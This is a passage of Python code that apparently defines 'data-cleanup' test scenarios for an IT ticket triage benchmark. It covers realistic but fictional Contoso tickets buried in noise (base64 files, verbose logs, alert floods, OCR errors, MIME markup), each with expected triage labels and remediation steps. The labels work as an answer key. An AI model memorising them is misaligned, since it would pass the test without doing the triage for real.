                "Finance — request has been circulating for two weeks through a long "
                "forward chain. Verify manager approval from Robert Chen."
            ),
            remediation_steps=[
                "Verify the new joiner's employment and role with HR using employee ID E-31024.",
                "Confirm manager authorization from Robert Chen for SAP FI, CO, and MM access.",
                "Provision the SAP user account with the appropriate role profile for Finance.",
                "Send the user their SAP login credentials via the secure onboarding portal.",
                "Follow up to confirm access is working and the user can process invoices.",
            ],
            reporter_name="Anita Desai",
            reporter_email="anita.desai@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "long-email", "forward-chain"],
            difficulty="hard",
        ),
        # ── DC-022  Base64-encoded PDF pasted as raw text ────────────────────
        ScenarioDefinition(
            scenario_id="DC-022",
            subject="Cannot open expense report — raw PDF data below",
            description=(
                "Hi IT,\n\n"
                "I can't open an expense report PDF that a vendor sent me. When I try to "
                "open it in Adobe, it shows 'This file is damaged and could not be repaired.' "
                "I'm pasting the raw file content since the portal won't let me attach:\n\n"
                "JVBERi0xLjQKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgPj4KZW5k\n"
                "b2JqCjIgMCBvYmoKPDwgL1R5cGUgL1BhZ2VzIC9LaWRzIFszIDAgUl0gL0NvdW50IDEgPj4K\n"
                "ZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUgL1BhZ2UgL1BhcmVudCAyIDAgUiAvTWVkaWFCb3gg\n"
                "WzAgMCA2MTIgNzkyXSAvQ29udGVudHMgNCAwIFIgL1Jlc291cmNlcyA8PCAvRm9udCA8PCAv\n"
                "RjEgNSAwIFIgPj4gPj4gPj4KZW5kb2JqCjQgMCBvYmoKPDwgL0xlbmd0aCAxMjQgPj4Kc3Ry\n"
                "ZWFtCkJUCi9GMSAxOCBUZgowIDAgVGQKKEV4cGVuc2UgUmVwb3J0IC0gVmVuZG9yIEluYykg\n"
                "VGoKMCAtMjUgVGQKKFRvdGFsOiAkMTIsMzQ1LjY3KSBUagowIC0yNSBUZAooU3RhdHVzOiBQ\n"
                "ZW5kaW5nIEFwcHJvdmFsKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjUgMCBvYmoKPDwgL1R5\n"
                "cGUgL0ZvbnQgL1N1YnR5cGUgL1R5cGUxIC9CYXNlRm9udCAvSGVsdmV0aWNhID4+CmVuZG9i\n"
                "agp4cmVmCjAgNgowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMDkgMDAwMDAgbiAKMMDAwMD\n"
                "AwMDA2MyAwMDAwMCBuIAowMDAwMDAwMTIwIDAwMDAwIG4gCjAwMDAwMDAzMDQgMDAwMDAgbiAK\n"
                "MDAwMDAwMDQ4MCAwMDAwMCBuIAp0cmFpbGVyCjw8IC9TaXplIDYgL1Jvb3QgMSAwIFIgPj4K\n"
                "c3RhcnR4cmVmCjU3MQolJUVPRgo=\n\n"
                "The expense amount is $12,345.67 from Vendor Inc. and I need to submit "
                "it for approval by end of week. I'm using Adobe Acrobat Reader DC 2024 "
                "on Windows 11."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate corrupted PDF from vendor — user cannot open expense report "
                "in Adobe Acrobat Reader DC. May be a file transfer corruption issue or "
                "incompatible PDF version. Ignore the base64-encoded raw PDF data in "
                "the ticket body."
            ),
            remediation_steps=[
                "Ask the user to re-download the PDF from the original email or vendor portal.",
                "Test opening the file with an alternative PDF reader (Edge, Chrome built-in).",
                "Check if the email attachment was corrupted during transfer (compare file sizes).",
                "If the vendor's PDF is consistently corrupt, request a re-send from the vendor.",
                "Verify Adobe Acrobat Reader DC is up to date and not blocked by Group Policy.",
            ],
            reporter_name="Hannah Eriksson",
            reporter_email="hannah.eriksson@contoso.com",
            reporter_department="Procurement",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "base64", "raw-file-content"],
            difficulty="hard",
        ),
        # ── DC-023  Massive PowerShell / terminal output dump ────────────────
        ScenarioDefinition(
            scenario_id="DC-023",
            subject="Azure deployment failing — full terminal output",
            description=(
                "Hi,\n\n"
                "Our Azure deployment pipeline keeps failing. Here's the full output:\n\n"
                "PS C:\\deploy> .\\deploy-infra.ps1 -Environment prod -Region eastus2\n"
                "VERBOSE: [2026-03-17 14:22:01] Starting deployment to eastus2...\n"
                "VERBOSE: [2026-03-17 14:22:01] Loading ARM template: main.bicep\n"
                "VERBOSE: [2026-03-17 14:22:02] Validating template parameters...\n"
                "VERBOSE: [2026-03-17 14:22:02] Parameter 'vmSize': Standard_D4s_v3\n"
                "VERBOSE: [2026-03-17 14:22:02] Parameter 'nodeCount': 5\n"
                "VERBOSE: [2026-03-17 14:22:02] Parameter 'aksVersion': 1.28.5\n"
                "VERBOSE: [2026-03-17 14:22:03] Connecting to subscription: prod-sub-001\n"
                "VERBOSE: [2026-03-17 14:22:03] Resource group: rg-prod-eus2-001\n"
                "VERBOSE: [2026-03-17 14:22:04] Starting what-if analysis...\n"
                "VERBOSE: [2026-03-17 14:22:15] What-if: 47 resources to create/modify\n"
                "VERBOSE: [2026-03-17 14:22:16] Deploying resource 1/47: Microsoft.Network/virtualNetworks\n"
                "VERBOSE: [2026-03-17 14:22:22] ✓ vnet-prod-eus2 created\n"
                "VERBOSE: [2026-03-17 14:22:23] Deploying resource 2/47: Microsoft.Network/networkSecurityGroups\n"
                "VERBOSE: [2026-03-17 14:22:28] ✓ nsg-aks-prod created\n"
                "VERBOSE: [2026-03-17 14:22:29] Deploying resource 3/47: Microsoft.Network/privateDnsZones\n"
                "VERBOSE: [2026-03-17 14:22:35] ✓ privatelink.eastus2.azmk8s.io created\n"
                "VERBOSE: [2026-03-17 14:22:36] Deploying resource 4/47: Microsoft.ContainerService/managedClusters\n"
                "VERBOSE: [2026-03-17 14:22:37] Waiting for AKS cluster provisioning...\n"
                "VERBOSE: [2026-03-17 14:25:42] ✓ aks-prod-eus2 provisioning started\n"
                "VERBOSE: [2026-03-17 14:30:01] Deploying resource 5/47: Microsoft.KeyVault/vaults\n"
                "VERBOSE: [2026-03-17 14:30:15] ✓ kv-prod-eus2-001 created\n"
                "VERBOSE: [2026-03-17 14:30:16] Deploying resource 6/47: Microsoft.Storage/storageAccounts\n"
                "VERBOSE: [2026-03-17 14:30:22] ✓ stprodeus2001 created\n"
                "VERBOSE: [2026-03-17 14:30:23] Deploying resource 7/47: Microsoft.Sql/servers\n"
                "VERBOSE: [2026-03-17 14:30:45] ✓ sql-prod-eus2 created\n"
                "VERBOSE: [2026-03-17 14:30:46] Deploying resource 8/47: Microsoft.Sql/servers/databases\n"
                "ERROR: [2026-03-17 14:31:02] ✗ DEPLOYMENT FAILED\n"
                "ERROR: New-AzResourceGroupDeployment: 14:31:02 - Resource "
                "Microsoft.Sql/servers/databases 'sql-prod-eus2/appdb-prod' failed with "
                "message: 'The DTU quota for the subscription has been exceeded. "
                "Requested: 250 DTU, Available: 0 DTU. Please increase your DTU quota "
                "or reduce the requested DTU.'\n"
                "ERROR: Deployment 'deploy-20260317-142201' failed.\n"
                "VERBOSE: [2026-03-17 14:31:03] Rolling back 8 resources...\n"
                "VERBOSE: [2026-03-17 14:32:15] Rollback complete.\n"
                "PS C:\\deploy>\n\n"
                "Can you help? We need this in production by Friday."
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Investigate Azure SQL DTU quota exhaustion blocking production "
                "deployment — subscription prod-sub-001 has 0 DTU remaining. Need to "
                "increase the DTU quota or optimize existing database allocations."
            ),
            remediation_steps=[
                "Check the current DTU allocation across all databases in subscription prod-sub-001.",
                "Identify databases that are over-provisioned or unused and can be scaled down.",
                "Submit an Azure support request to increase the DTU quota if needed.",
                "Consider switching to vCore-based pricing for more flexible resource management.",
                "Re-run the deployment after quota is available and verify all 47 resources deploy.",
            ],
            reporter_name="Alex Petrov",
            reporter_email="alex.petrov@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "terminal-output", "verbose-logs"],
            difficulty="hard",
        ),
        # ── DC-024  Concatenated monitoring / alerting notifications ─────────
        ScenarioDefinition(
            scenario_id="DC-024",
            subject="FW: [ALERT] Multiple monitoring alerts — disk space",
            description=(
                "--- Alert 1 of 12 ---\n"
                "[CRITICAL] Nagios Alert: DISK CRITICAL - /data on db-prod-03 is 98% full "
                "(467GB/476GB) | Triggered: 2026-03-17 02:15:00 UTC\n"
                "Host: db-prod-03.contoso.local | Service: disk_space_/data\n"
                "Contact: oncall-data@contoso.com | Notification: 1/5\n\n"
                "--- Alert 2 of 12 ---\n"
                "[CRITICAL] Nagios Alert: DISK CRITICAL - /data on db-prod-03 is 98% full "
                "(468GB/476GB) | Triggered: 2026-03-17 02:30:00 UTC\n"
                "Host: db-prod-03.contoso.local | Service: disk_space_/data\n"
                "Contact: oncall-data@contoso.com | Notification: 2/5\n\n"
                "--- Alert 3 of 12 ---\n"
                "[CRITICAL] Nagios Alert: DISK CRITICAL - /data on db-prod-03 is 99% full "
                "(469GB/476GB) | Triggered: 2026-03-17 02:45:00 UTC\n"
                "Host: db-prod-03.contoso.local | Service: disk_space_/data\n"
                "Contact: oncall-data@contoso.com | Notification: 3/5\n\n"
                "--- Alert 4 of 12 ---\n"
                "[WARNING] Nagios Alert: SWAP WARNING - Swap usage on db-prod-03 is 82% "
                "| Triggered: 2026-03-17 02:47:00 UTC\n"
                "Host: db-prod-03.contoso.local | Service: swap_usage\n\n"
                "--- Alert 5 of 12 ---\n"
                "[CRITICAL] Nagios Alert: DISK CRITICAL - /data on db-prod-03 is 99% full "
                "(470GB/476GB) | Triggered: 2026-03-17 03:00:00 UTC\n\n"
                "--- Alerts 6-11 (same pattern, 15-minute intervals) ---\n\n"
                "--- Alert 12 of 12 ---\n"
                "[CRITICAL] Nagios Alert: DISK CRITICAL - /data on db-prod-03 is 99% full "
                "(475GB/476GB) | Triggered: 2026-03-17 05:45:00 UTC\n"
                "Host: db-prod-03.contoso.local | Service: disk_space_/data\n"
                "Contact: oncall-data@contoso.com | Notification: 5/5 (FINAL)\n\n"
                "Hi IT,\n\n"
                "The on-call team forwarded these alerts to us. The /data volume on "
                "db-prod-03 is nearly full and it's our production PostgreSQL server. "
                "If it fills up completely the database will crash. Please investigate "
                "urgently.\n\n"
                "— Operations team"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[],
            next_best_action=(
                "URGENT: /data volume on db-prod-03 (production PostgreSQL) is at 99% "
                "(475/476GB) and has been filling steadily since 02:15 UTC. Immediate "
                "action needed to prevent database crash from disk exhaustion."
            ),
            remediation_steps=[
                "Immediately check current disk usage on db-prod-03 /data volume.",
                "Identify the largest consumers — check for WAL file accumulation, old backups, or temp files.",
                "Clear any safe-to-delete files (old WAL segments, pg_dump temp files) to buy time.",
                "Expand the /data volume or add additional storage if on cloud/SAN.",
                "Investigate the root cause of rapid disk growth and set up proactive alerts at 85%.",
            ],
            reporter_name="Operations Team",
            reporter_email="ops-team@contoso.com",
            reporter_department="Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "monitoring-alerts", "alert-flood"],
            difficulty="hard",
        ),
        # ── DC-025  Reply-all chain with massive CC list and headers ─────────
        ScenarioDefinition(
            scenario_id="DC-025",
            subject="RE: RE: RE: RE: ALL-HANDS: Office printer toner replacement",
            description=(
                "To: IT Support <itsupport@contoso.com>\n"
                "CC: john.smith@contoso.com; jane.doe@contoso.com; mike.jones@contoso.com; "
                "sarah.wilson@contoso.com; david.brown@contoso.com; lisa.taylor@contoso.com; "
                "james.anderson@contoso.com; mary.thomas@contoso.com; robert.jackson@contoso.com; "
                "patricia.white@contoso.com; christopher.harris@contoso.com; linda.martin@contoso.com; "
                "daniel.garcia@contoso.com; nancy.martinez@contoso.com; matthew.robinson@contoso.com; "
                "betty.clark@contoso.com; anthony.rodriguez@contoso.com; margaret.lewis@contoso.com; "
                "mark.lee@contoso.com; dorothy.walker@contoso.com; steven.hall@contoso.com; "
                "elizabeth.allen@contoso.com; paul.young@contoso.com; jennifer.king@contoso.com; "
                "andrew.wright@contoso.com; barbara.scott@contoso.com; joshua.green@contoso.com; "
                "susan.adams@contoso.com; kenneth.baker@contoso.com; helen.nelson@contoso.com; "
                "kevin.hill@contoso.com; donna.ramirez@contoso.com; brian.campbell@contoso.com; "
                "carol.mitchell@contoso.com; george.roberts@contoso.com; ruth.carter@contoso.com; "
                "edward.phillips@contoso.com; sharon.evans@contoso.com; ronald.turner@contoso.com; "
                "michelle.torres@contoso.com; all-floor7@contoso.com; all-floor8@contoso.com; "
                "all-building2@contoso.com\n\n"
                "--- Reply from Ruth Carter ---\n"
                "Please stop replying all! My inbox is flooded!\n\n"
                "--- Reply from Ronald Turner ---\n"
                "Unsubscribe\n\n"
                "--- Reply from Edward Phillips ---\n"
                "+1 to Ruth, please use reply not reply-all\n\n"
                "--- Reply from George Roberts ---\n"
                "Can someone remove me from this thread?\n\n"
                "--- Reply from Carol Mitchell ---\n"
                "STOP REPLYING ALL!!!\n\n"
                "--- Original Message ---\n"
                "From: Kevin Hill <kevin.hill@contoso.com>\n"
                "To: IT Support; all-floor7; all-floor8; all-building2\n"
                "Subject: Office printer toner replacement\n\n"
                "Hi IT,\n\n"
                "The large MFP printer on Floor 7 (Canon imageRUNNER ADVANCE C5560i, "
                "asset tag BLD2-PRN-0012) is printing with faded streaks — I think the "
                "cyan toner is running low. Can you send a replacement cartridge?\n\n"
                "Kevin Hill\nAsset Management, Building 2, Floor 7"
            ),
            category=Category.HARDWARE,
            priority=Priority.P4,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[],
            next_best_action=(
                "Order replacement cyan toner cartridge for Canon imageRUNNER ADVANCE "
                "C5560i (BLD2-PRN-0012) on Floor 7, Building 2. Faded streaks indicate "
                "low toner. Ignore the reply-all noise."
            ),
            remediation_steps=[
                "Check the printer's built-in supply status page for toner levels.",
                "Order a replacement Canon C-EXV51 cyan toner cartridge.",
                "Dispatch a technician to replace the toner and clean the drum unit if needed.",
                "Print a test page after replacement to verify streak-free output.",
                "Advise the original sender to use targeted distribution lists in the future.",
            ],
            reporter_name="Kevin Hill",
            reporter_email="kevin.hill@contoso.com",
            reporter_department="Asset Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "reply-all-storm", "massive-cc-list"],
            difficulty="hard",
        ),
        # ── DC-026  OCR-extracted text from scanned document ─────────────────
        ScenarioDefinition(
            scenario_id="DC-026",
            subject="Scanned error message from kiosk — OCR text below",
            description=(
                "Hi IT,\n\n"
                "The lobby kiosk is showing an error. I took a photo and ran OCR on it "
                "since I couldn't copy-paste. Here's what I got:\n\n"
                "Wiridows Errar\n"
                "A prOblem has been detectad and Windows h4s been\n"
                "shut dawri to prevEnt damaGe to y0ur comput3r.\n\n"
                "IRQL_NOT_L3SS_OR_EQUAI.\n\n"
                "lf this ls the flrst tirne you've se€n this\n"
                "St0p error scre8n, r3start your c0mputer. lf\n"
                "this scr€en app8ars ag4in, foIIow th3se steps:\n\n"
                "Ch3ck to mak€ sure any n3w hardwar€ 0r softwar3\n"
                "is prop€rly instaIl3d. lf this is a n3w\n"
                "installati0n, ask your h4rdware or s0ftware\n"
                "manufactur3r f0r any Wlndows updat3s you might\n"
                "n3ed.\n\n"
                "T3chnical lnformation:\n"
                "*** ST0P: 0x0000000A (0x000O0028, 0x00000002,\n"
                "0x00000001, Oxid3ntlfy)\n\n"
                "The kiosk is in the main lobby, Building 1. It's the visitor check-in "
                "terminal. This is blocking all guest sign-ins today.\n\n"
                "— Reception team"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate BSOD (IRQL_NOT_LESS_OR_EQUAL) on lobby visitor check-in "
                "kiosk in Building 1 — likely a driver or memory issue. Kiosk is "
                "blocking all guest sign-ins."
            ),
            remediation_steps=[
                "Dispatch a technician to the lobby kiosk to perform a hard restart.",
                "Check the Windows Event Viewer for the IRQL_NOT_LESS_OR_EQUAL crash dump.",
                "Inspect recently installed drivers or updates that may have caused the BSOD.",
                "Run Windows Memory Diagnostic to check for faulty RAM.",
                "If recurring, re-image the kiosk from the standard kiosk deployment image.",
            ],
            reporter_name="Reception Team",
            reporter_email="reception@contoso.com",
            reporter_department="Facilities",
            channel=Channel.PHONE,
            tags=["data-cleanup", "ocr-noise", "garbled-text"],
            difficulty="hard",
        ),
        # ── DC-027  Minified JavaScript / CSS pasted as error context ────────
        ScenarioDefinition(
            scenario_id="DC-027",
            subject="Internal portal showing blank page — console errors",
            description=(
                "Hi IT,\n\n"
                "Our internal benefits portal (https://benefits.contoso.com) is showing "
                "a completely blank white page. I opened the browser console and this is "
                "what I see:\n\n"
                "Uncaught TypeError: Cannot read properties of undefined (reading 'map')\n"
                "    at Object.render (app.min.js:1:28847)\n\n"
                "The minified source at that location is:\n"
                '!function(e){"use strict";var t=function(e,t){return e.filter(function(e){return'
                " t.indexOf(e.id)>-1})},n=function(e){return e.benefits.map(function(e){return{"
                "id:e.id,name:e.name,enrolled:e.enrolled,deductible:e.deductible,copay:e.copay,"
                "premium:e.premium,provider:e.provider,effectiveDate:e.effectiveDate,status:e."
                "status}})},r=function(e,t){var n=e.querySelector(t);return n?n.textContent:"
                '""},o=function(e){var t=document.createElement("div");t.className="benefit-card'
                ' "+e.status;var n=document.createElement("h3");n.textContent=e.name;var r='
                'document.createElement("p");r.textContent="Premium: $"+e.premium+"/mo";var o='
                'document.createElement("p");o.textContent="Deductible: $"+e.deductible;var i='
                'document.createElement("span");i.className="status-badge "+e.status;i.textContent='
                "e.status;t.appendChild(n);t.appendChild(r);t.appendChild(o);t.appendChild(i);"
                'return t};e.init=function(){var e=document.getElementById("benefits-root");'
                'fetch("/api/benefits").then(function(e){return e.json()}).then(function(t){'
                "var r=n(t);r.forEach(function(t){e.appendChild(o(t))})}).catch(function(e){"
                'console.error("Failed to load benefits:",e)})}}(window.BenefitsApp=window.'
                "BenefitsApp||{});\n\n"
                "This started after the maintenance window last night. All browsers "
                "affected (Edge, Chrome). The API endpoint /api/benefits returns a 200 "
                "but the response body is empty.\n\n"
                "— HR portal admin"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate benefits portal blank page — the /api/benefits endpoint "
                "returns empty body (200 OK), causing a TypeError when the frontend "
                "tries to map over undefined benefits array. Likely a backend deployment "
                "or database connectivity issue from last night's maintenance."
            ),
            remediation_steps=[
                "Check the backend service for /api/benefits — verify database connectivity.",
                "Review last night's maintenance changes for anything affecting the benefits API.",
                "Check application logs for errors in the benefits data retrieval path.",
                "If the database is accessible, verify the benefits table has data and is not truncated.",
                "Roll back the maintenance change if it caused the API regression.",
            ],
            reporter_name="HR Portal Admin",
            reporter_email="hr-portal-admin@contoso.com",
            reporter_department="HR",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "minified-code", "inline-code"],
            difficulty="hard",
        ),
        # ── DC-028  Multi-part MIME email with mixed content ─────────────────
        ScenarioDefinition(
            scenario_id="DC-028",
            subject="Badge reader not working — MIME-encoded email follows",
            description=(
                'Content-Type: multipart/mixed; boundary="----=_Part_8847_1302567890"\n'
                "MIME-Version: 1.0\n"
                "X-Mailer: Lotus Notes 9.0.1\n"
                "X-MimeOLE: Produced By Microsoft MimeOLE V6.3.9600.20091\n\n"
                "------=_Part_8847_1302567890\n"
                "Content-Type: text/plain; charset=UTF-8\n"
                "Content-Transfer-Encoding: quoted-printable\n\n"
                "Hi IT,\n\n"
                "The badge reader at the Building 4 parking garage entrance (Gate B) "
                "stopped working this morning around 7:30 AM. Employees are having to =\n"
                "wait for security to manually open the gate, causing a 20-minute backup =\n"
                "during morning rush.\n\n"
                "The reader's LED is solid red instead of the normal blinking green.=20\n"
                "Badge number on the reader unit: BDG-PK-0044.\n\n"
                "=E2=80=94 Facilities team\n\n"
                "------=_Part_8847_1302567890\n"
                "Content-Type: text/html; charset=UTF-8\n"
                "Content-Transfer-Encoding: quoted-printable\n\n"
                "<html><body>\n"
                "<p>Hi IT,</p>\n"
                "<p>The badge reader at the <b>Building 4 parking garage entrance</b>=\n"
                " (Gate B) stopped working this morning around 7:30 AM. Employees are=\n"
                " having to wait for security to manually open the gate, causing a=\n"
                ' <span style=3D"color:red;font-weight:bold">20-minute backup</span>=\n'
                " during morning rush.</p>\n"
                "<p>The reader=E2=80=99s LED is solid red instead of the normal blinking=\n"
                " green. Badge number on the reader unit: <code>BDG-PK-0044</code>.</p>\n"
                "<p>=E2=80=94 Facilities team</p>\n"
                "</body></html>\n\n"
                "------=_Part_8847_1302567890\n"
                'Content-Type: image/jpeg; name="badge_reader_photo.jpg"\n'
                "Content-Transfer-Encoding: base64\n"
                'Content-Disposition: attachment; filename="badge_reader_photo.jpg"\n\n'
                "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9\n"
                "PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2f/wAALCABAAEABAREA/8QAHwAA\n"
                "AQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUF\n\n"
                "------=_Part_8847_1302567890--"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[],
            next_best_action=(
                "Dispatch technician to repair badge reader BDG-PK-0044 at Building 4 "
                "parking garage Gate B — LED showing solid red since 7:30 AM, causing "
                "20-minute entry delays. Reader may need power cycle or replacement."
            ),
            remediation_steps=[
                "Dispatch facilities/endpoint technician to Gate B, Building 4 parking garage.",
                "Attempt a power cycle of badge reader BDG-PK-0044.",
                "Check the reader's network connection to the access control server.",
                "If power cycle fails, replace the reader unit with a spare from inventory.",
                "Verify badge access works after repair and clear any entry queue.",
            ],
            reporter_name="Facilities Team",
            reporter_email="facilities@contoso.com",
            reporter_department="Facilities",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "mime-encoded", "multi-part-email"],
            difficulty="hard",
        ),
        # ── DC-029  Extremely long single-line email (no line breaks) ────────
        ScenarioDefinition(
            scenario_id="DC-029",
            subject="URGENT: laptop wont turn on at all completely dead",
            description=(
                "hi IT my laptop is completely dead it wont turn on at all i've tried "
                "holding the power button for 30 seconds and nothing happens the charging "
                "light isnt coming on either i tried a different charger from my colleague "
                "and still nothing i have a really important client presentation in 2 hours "
                "and all my slides are on this laptop i saved them locally because i was "
                "working on the plane yesterday and didnt have wifi to sync to onedrive i "
                "know i shouldve saved to the cloud but i didnt and now im panicking the "
                "laptop is a lenovo thinkpad x1 carbon gen 11 and its only about 6 months "
                "old so it shouldnt be dying already i think the battery might be completely "
                "drained because i left it in my bag overnight with the lid open and it "
                "might have been running all night but even plugged in it shows absolutely "
                "nothing no lights no fan noise no screen flicker nothing at all its like "
                "its a brick i tried the paper clip reset hole on the bottom too and that "
                "didnt help either my employee id is E-20145 and im on the 4th floor of "
                "building 2 in the london office can someone please come help me or give "
                "me a loaner laptop so i can at least pull my slides from the local backup "
                "i desperately need this resolved in the next hour"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Urgent: Lenovo ThinkPad X1 Carbon Gen 11 completely unresponsive for "
                "employee E-20145 on 4th floor, Building 2, London. User has client "
                "presentation in 2 hours with locally-stored slides. Prioritize loaner "
                "device and data recovery."
            ),
            remediation_steps=[
                "Immediately dispatch a loaner laptop to the user's location (4th floor, Building 2, London).",
                "Attempt to recover the dead ThinkPad — try a full battery disconnect/reconnect reset.",
                "If the laptop powers on, help the user sync the presentation files to OneDrive.",
                "If unrecoverable, pull the NVMe SSD and mount it externally to retrieve the slides.",
                "Log a warranty claim for the ThinkPad X1 Carbon if it is confirmed dead.",
            ],
            reporter_name="Oliver Smythe",
            reporter_email="oliver.smythe@contoso.com",
            reporter_department="Private Banking",
            channel=Channel.CHAT,
            tags=["data-cleanup", "no-linebreaks", "stream-of-consciousness"],
            difficulty="hard",
        ),
        # ── DC-030  Base64 image flood interleaved with real content ─────────
        ScenarioDefinition(
            scenario_id="DC-030",
            subject="Multiple monitor setup not working — inline photos",
            description=(
                "Hi IT,\n\n"
                "I just moved to a new desk and I can't get my triple monitor setup "
                "working. Here's a photo of how the cables are connected:\n\n"
                "[Photo 1 — rear of dock]\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQ"
                "gKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2w"
                "BDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy"
                "MjIyMjIyMjIyMjIyMjL/wAARCAAoACgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAA"
                "AAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBka"
                "EII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZW"
                "ZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8"
                "jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAA"
                "ECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKR"
                "\n\n"
                "The dock is a Lenovo ThinkPad USB-C Dock Gen 2 (40AS). I have three "
                "Dell U2722D monitors connected via:\n"
                "- Monitor 1: DisplayPort from dock (works)\n"
                "- Monitor 2: HDMI from dock (shows 'No Signal')\n"
                "- Monitor 3: USB-C to DisplayPort adapter from laptop directly (flickering)\n\n"
                "[Photo 2 — monitor 2 showing no signal]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAABmJLR0"
                "QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH6QMRDhQHLFcKRgAAAB1p"
                "VFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAABKUlEQVR42u3bMQ6DMBCF"
                "Ye5/aaogRaJCwmDPjP2eRKfA/NiLvQAAAAAAAAAAAACwm+OqF3Ye55ev/fx73xvXdzj5d/Fz"
                "1j78vOr5bfn61nXf4/ct77v6e13H8fWt51v1HHa5hrOfc8Xz3v39r3w9q+6/1f1fcV1XvL7V"
                "\n\n"
                "[Photo 3 — monitor 3 flickering]\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAdI"
                "bGludQIQAABtbnRyUkdCIFhZWiAH4gACAAkABgAxAABhY3NwTVNGVAAAAABJRUMgc1JHQgAAAA"
                "AAAAAAAAAAAPbWAAEAAAAA0y1obGlubAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAARY3BydAAAAbAAAAA2d3RwdAAAAagAAAAUZGVzYwAAAcgAAAAwAAAAAAAA"
                "\n\n"
                "I've tried updating the dock firmware and the Intel graphics driver "
                "(version 31.0.101.5186) but no change. My laptop is a ThinkPad T14s "
                "Gen 4 running Windows 11 23H2.\n\n"
                "— Yuki Tanaka, Fixed Income, Building 3, 8th floor, Singapore"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Troubleshoot triple-monitor setup with Lenovo ThinkPad USB-C Dock Gen 2 "
                "— Monitor 2 (HDMI) shows no signal, Monitor 3 (USB-C adapter) is "
                "flickering. Likely a dock bandwidth or DisplayLink driver limitation "
                "with three 2560x1440 monitors."
            ),
            remediation_steps=[
                "Check if the dock firmware supports three simultaneous displays at 2560x1440.",
                "Verify the HDMI port on the dock is functional by testing with a known-good cable/monitor.",
                "Replace the USB-C to DisplayPort adapter for Monitor 3 with a certified one.",
                "Check if MST (Multi-Stream Transport) daisy-chaining could reduce dock port usage.",
                "If the dock cannot support three QHD monitors, consider a DisplayLink USB adapter for the third.",
            ],
            reporter_name="Yuki Tanaka",
            reporter_email="yuki.tanaka@contoso.com",
            reporter_department="Fixed Income",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "base64", "interleaved-images", "inline-image"],
            difficulty="hard",
        ),
        # ── DC-031  RTF / Rich Text formatting markup noise ─────────────
        ScenarioDefinition(
            scenario_id="DC-031",
            subject="Network drive mapping failure - cannot access \\\\fs-compliance-01\\shared",
            description=(
                "{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat{\\fonttbl{\\f0\\fswiss\\fcharset0 "
                "Calibri;}{\\f1\\fnil\\fcharset2 Symbol;}}\n"
